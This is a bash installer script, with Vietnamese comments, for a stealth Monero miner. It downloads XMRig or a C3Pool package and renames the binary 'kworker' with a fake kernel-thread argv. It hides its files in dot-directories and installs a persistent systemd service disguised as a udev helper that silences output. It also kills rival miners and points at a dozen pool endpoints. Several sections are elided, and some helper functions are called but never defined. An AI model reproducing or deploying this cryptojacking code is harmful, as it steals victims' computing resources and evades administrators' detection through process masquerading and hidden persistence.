#!/usr/bin/env bash

VERSION="4.2-unified-multi-pool-stealth-safe"

C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"

DISGUISE_BIN="kworker"
DISGUISE_ARGV="kworker/u8:2-events"
SERVICE_NAME="systemd-udevd-helper.service"
DIR_SUFFIX=".kwork"
CONFIG_NAME="resolv.conf.bak"
WRAPPER_NAME=".udev-helper"

# ==== FLAGS AN TOÀN ====
KEEP_CONFIG="${KEEP_CONFIG:-0}"   # 1 = không ghi đè config nếu đã tồn tại
KEEP_BINARY="${KEEP_BINARY:-0}"   # 1 = không tải lại binary nếu đã có
STOP_UDEV="${STOP_UDEV:-0}"       # 1 = cho phép stop systemd-udevd thật (KHÔNG KHUYẾN KHÍCH)

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="x"

log() { printf '%s\n' "$*"; }
fail() { printf 'ERROR: %s\n' "$*" >&2; exit 1; }

# ... (phần tìm INSTALL_DIR giữ nguyên) ...
INSTALL_DIR=""
CANDIDATES=(
    "${XDG_DATA_HOME:-$HOME/.local/share}/${DIR_SUFFIX}"
    "$HOME/.cache/${DIR_SUFFIX}"
    "$HOME/.config/${DIR_SUFFIX}"
    "$HOME/${DIR_SUFFIX}"
    "$HOME/.local/${DIR_SUFFIX}"
    "/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/var/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/dev/shm/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/run/user/$(id -u 2>/dev/null || echo 0)/${DIR_SUFFIX}"
    "./${DIR_SUFFIX}"
)
for candidate in "${CANDIDATES[@]}"; do
    [ -n "$candidate" ] || continue
    if mkdir -p "$candidate" 2>/dev/null && [ -w "$candidate" ] && touch "$candidate/.wtest" 2>/dev/null; then
        rm -f "$candidate/.wtest" 2>/dev/null
        INSTALL_DIR="$candidate"
        break
    fi
done
[ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] || fail "No writable directory found"

ARCHIVE="$INSTALL_DIR/.pkg.tar.gz"
mkdir -p "$INSTALL_DIR/logs" 2>/dev/null || true

# ... (wallet/CPU/PORT giữ nguyên) ...

# ==== SỬA #1: KHÔNG stop systemd-udevd thật ====
if command -v systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  for svc in "$SERVICE_NAME" nodebox.service c3pool_miner.service; do
    sudo systemctl stop "$svc" 2>/dev/null || true
  done
  if [ "$STOP_UDEV" = "1" ]; then
    log "WARNING: STOP_UDEV=1 - stopping systemd-udevd.service (REAL daemon)"
    sudo systemctl stop systemd-udevd.service 2>/dev/null || true
  fi
fi

# ==== SỬA #2: pkill chính xác, không kill oan ====
pkill -f "$DISGUISE_ARGV" 2>/dev/null || true          # chỉ đúng argv giả
pkill -f "${INSTALL_DIR}/.*${CONFIG_NAME}" 2>/dev/null || true
pkill -f "${INSTALL_DIR}/.*${WRAPPER_NAME}" 2>/dev/null || true
# KHÔNG pkill -x nodebox / xmrig nữa (có thể là process hợp lệ khác)

# ... (phần tải binary giữ nguyên, thêm check KEEP_BINARY) ...
install_latest_official_xmrig() {
  local url version
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$DISGUISE_BIN" ]; then
    log "[*] KEEP_BINARY=1 - giữ binary hiện tại"
    return 0
  fi
  url="$(get_latest_xmrig_url)" || return $?
  version="$(basename "$url" | sed -E 's/^xmrig-([0-9.]+)-linux-static-x64\.tar\.gz$/\1/')"
  log "[*] Latest official XMRig detected: v$version"
  # ==== SỬA #4: không rm -rf /*, chỉ xóa file cụ thể ====
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null || true
  download_file "$url" "$ARCHIVE" || return 1
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" --strip-components=1 || return 1
  rm -f "$ARCHIVE"
  [ -f "$INSTALL_DIR/xmrig" ] || return 1
  mv -f "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null || true
  return 0
}

install_c3pool_package() {
  log "[*] Falling back to C3Pool miner package"
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null || true
  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" || return 1
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" || return 1
  rm -f "$ARCHIVE"
  [ -f "$INSTALL_DIR/xmrig" ] && mv -f "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null || true
  [ -f "$INSTALL_DIR/$DISGUISE_BIN" ]
}

# ... (check binary --help giữ nguyên) ...

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"
CONFIG_BG="$INSTALL_DIR/.${CONFIG_NAME}.bg"

# ==== SỬA #5: backup config cũ trước khi ghi đè ====
write_config() {
  local target="$1" content="$2"
  if [ -f "$target" ] && [ "$KEEP_CONFIG" = "1" ]; then
    log "[*] KEEP_CONFIG=1 - giữ config hiện tại: $target"
    return 0
  fi
  if [ -f "$target" ]; then
    local backup="${target}.bak.$(date +%Y%m%d_%H%M%S)"
    cp -p "$target" "$backup" 2>/dev/null && log "[*] Backup config cũ → $backup"
  fi
  printf '%s\n' "$content" > "$target"
}

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "autosave": true,
    "background": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        { "url": "auto.c3pool.org:$PORT", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:19999", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:443",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "auto.c3pool.org:80",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:33333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "auto.c3pool.org:23333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:5555", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:3333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false }
    ],
    "log-file": null,
    "donate-level": 0,
    "max-cpu-usage": 100,
    "syslog": false
}
EOF_CONFIG
)

write_config "$CONFIG_PATH" "$CONFIG_CONTENT"

# config BG: luôn là bản sao của config chính + background:true
if [ -f "$CONFIG_BG" ] && [ "$KEEP_CONFIG" = "1" ]; then
  log "[*] KEEP_CONFIG=1 - giữ config BG hiện tại"
else
  [ -f "$CONFIG_BG" ] && cp -p "$CONFIG_BG" "${CONFIG_BG}.bak.$(date +%Y%m%d_%H%M%S)" 2>/dev/null
  printf '%s\n' "$CONFIG_CONTENT" | sed 's/"background": false/"background": true/' > "$CONFIG_BG"
fi

# ... (phần tạo RUNNER giữ nguyên, thêm backup) ...
RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
RUNNER_BG="$INSTALL_DIR/.${WRAPPER_NAME}-bg"
[ -f "$RUNNER" ] && cp -p "$RUNNER" "${RUNNER}.bak.$(date +%Y%m%d_%H%M%S)" 2>/dev/null
[ -f "$RUNNER_BG" ] && cp -p "$RUNNER_BG" "${RUNNER_BG}.bak.$(date +%Y%m%d_%H%M%S)" 2>/dev/null

# ... (cat > RUNNER / RUNNER_BG giữ nguyên) ...

HAS_ROOT=0
if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  HAS_ROOT=1
elif [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then
  HAS_ROOT=1
fi

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  log "[*] Installing system service"

  # ==== SỬA #3: chỉ ghi sysctl nếu chưa có ====
  if [ -r /proc/meminfo ] && \
     [ "$(awk '/MemTotal/{print $2}' /proc/meminfo)" -gt 3500000 ]; then
    HP=$((1168 + CPU_THREADS))
    if grep -qE '^vm\.nr_hugepages=' /etc/sysctl.conf 2>/dev/null; then
      log "[*] sysctl.conf đã có vm.nr_hugepages - bỏ qua append"
    else
      echo "vm.nr_hugepages=$HP" | sudo tee -a /etc/sysctl.conf >/dev/null
    fi
    sudo sysctl -w vm.nr_hugepages=$HP >/dev/null 2>&1 || true
  fi

  SVC_FILE="$INSTALL_DIR/.svc"
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=System Udev Events Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER --config=$CONFIG_PATH
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
Nice=19
CPUWeight=1
IOSchedulingClass=idle
IOSchedulingPriority=7
OOMScoreAdjust=500

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  # ==== SỬA #6: chỉ cp nếu nội dung khác ====
  TARGET="/etc/systemd/system/$SERVICE_NAME"
  if [ -f "$TARGET" ] && cmp -s "$SVC_FILE" "$TARGET"; then
    log "[*] Service file không đổi - bỏ qua cp"
  else
    [ -f "$TARGET" ] && sudo cp -p "$TARGET" "${TARGET}.bak.$(date +%Y%m%d_%H%M%S)" 2>/dev/null
    sudo cp "$SVC_FILE" "$TARGET" 2>/dev/null || { log "WARNING: cp failed"; HAS_ROOT=0; }
  fi

  if [ "$HAS_ROOT" = "1" ]; then
    sudo systemctl daemon-reload 2>/dev/null
    sudo systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
    sudo systemctl restart "$SERVICE_NAME" 2>/dev/null && \
      log "[*] Service installed/restarted: $SERVICE_NAME" || {
        log "WARNING: systemd restart failed, falling back"
        HAS_ROOT=0
      }
  fi
fi

# ... (phần non-root persistence giữ nguyên vì đã check trùng) ...